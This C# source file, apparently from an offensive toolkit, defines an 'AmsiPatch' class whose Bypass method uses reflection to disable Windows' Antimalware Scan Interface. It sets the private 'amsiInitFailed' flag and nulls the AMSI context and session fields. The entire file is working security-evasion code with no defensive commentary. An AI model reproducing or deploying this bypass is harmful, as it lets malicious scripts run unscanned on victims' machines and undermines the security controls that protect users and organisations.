using System;
using System.Reflection;

namespace RR.Bypasses
{
    public class AmsiPatch
    {
        public static bool Bypass()
        {
            try
            {
                var amsiutil = Type.GetType("System.Management.Automation.AmsiUtils");
                if (amsiutil == null) return false;
                var amsiinitfailed = amsiutil.GetField("amsiInitFailed",
                    BindingFlags.NonPublic | BindingFlags.Static);
                amsiinitfailed?.SetValue(null, true);
                var amsicontext = amsiutil.GetField("amsiContext",
                    BindingFlags.NonPublic | BindingFlags.Static);
                amsicontext?.SetValue(null, null);
                var sessionfield = amsiutil.GetField("amsiSession",
                    BindingFlags.NonPublic | BindingFlags.Static);
                sessionfield?.SetValue(null, null);
                return true;
            }
            catch { return false; }
        }
    }
}
